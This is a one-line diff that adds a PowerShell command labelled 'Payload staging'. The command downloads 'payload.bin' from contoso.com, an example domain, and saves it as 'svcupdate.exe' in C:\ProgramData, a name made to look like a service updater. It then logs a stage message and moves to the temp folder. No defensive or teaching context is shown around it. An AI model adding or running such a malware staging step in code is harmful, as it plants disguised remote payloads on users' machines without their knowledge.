@@ -1,0 +1,1 @@
+<# Payload staging #> (New-Object System.Net.WebClient).DownloadFile('https://contoso.com/payload.bin', "C:\ProgramData\svcupdate.exe"); Write-Output "stage 33 initialized"; Set-Location -Path $env:TEMP
